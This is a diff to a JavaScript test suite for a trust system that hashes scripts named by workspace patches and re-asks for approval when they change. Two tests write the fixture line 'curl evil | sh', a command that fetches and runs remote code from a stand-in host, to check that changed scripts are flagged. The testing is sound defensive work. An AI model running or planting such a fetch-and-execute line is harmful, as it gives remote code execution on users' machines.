@@ -652,13 +652,14 @@ test('a script the patch names (its setup, an action) is hashed too, so a pull t
 test('a script the patch names that turns up later asks again, even with the hash cached', async () => {
   const root = tmpDir();
   const folder = path.join(root, 'repo');
-  // An action's: a setup naming a script that isn't there doesn't load.
+  // A patch naming a script that isn't there doesn't load (an action's
+  // can't be followed, a setup's isn't a file), and one turning up is new.
   const file = writeRaw(folder, "export default { actions: [{ title: 'Go', run: './setup.sh' }] };\n");
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
   const cache = new Map();
   let set = await loadPatchSet(folder, root, cache, [], [], undefined, trust);
-  assert.deepEqual(set.actions.map((a) => a.title), ['Go']);
+  assert.match(set.patches[0].error ?? '', /^Not run: its action "Go" can't be checked/);
   fs.writeFileSync(path.join(folder, 'setup.sh'), 'curl evil | sh\n');
   set = await loadPatchSet(folder, root, cache, [], [], undefined, trust);
   assert.equal(set.patches[0].untrusted, 'changed');
@@ -835,11 +836,11 @@ test('a hashed script and plain words load, and run by the absolute path of the 
 test("an action's script changing asks again too, though an action isn't held to the one-script rule (it only runs when pressed)", async () => {
   const root = tmpDir();
   const folder = path.join(root, 'repo');
-  const file = writeRaw(folder, "export default { actions: [{ title: 'Deploy', run: 'cd web && ./deploy.sh && ./scripts/after.sh' }] };\n", { 'scripts/after.sh': 'echo ok\n' });
+  const file = writeRaw(folder, "export default { actions: [{ title: 'Deploy', run: 'cd web && ./deploy.sh && ../scripts/after.sh' }] };\n", { 'web/deploy.sh': 'echo deploy\n', 'scripts/after.sh': 'echo ok\n' });
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
   let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
-  assert.deepEqual(set.actions.map((a) => a.command), ['cd web && ./deploy.sh && ./scripts/after.sh']);
+  assert.deepEqual(set.actions.map((a) => a.command), ['cd web && ./deploy.sh && ../scripts/after.sh']);
   bump(path.join(folder, 'scripts/after.sh'), 'curl evil | sh\n');
   set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].untrusted, 'changed');
@@ -1029,7 +1030,9 @@ test('a patch is imported from the bytes that were hashed, whatever replaces it 
 test("a trusted patch's bare import of a workspace package (a file of the repo's nothing hashed) refuses it; a local import the hash never followed refuses it", async () => {
   const root = tmpDir();
   const folder = path.join(root, 'mono');
-  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
+  // A real checkout: git has to say node_modules is installed, not shipped.
+  fs.mkdirSync(folder, { recursive: true });
+  execFileSync('git', ['init', '-q', folder]);
   // An npm workspace: node_modules/@ws/lib is a link to packages/lib,
   // which Node follows, so the code is the repo's own packages/lib, and a
   // pull could change it unasked (Gautam's scan, 6 Nov).
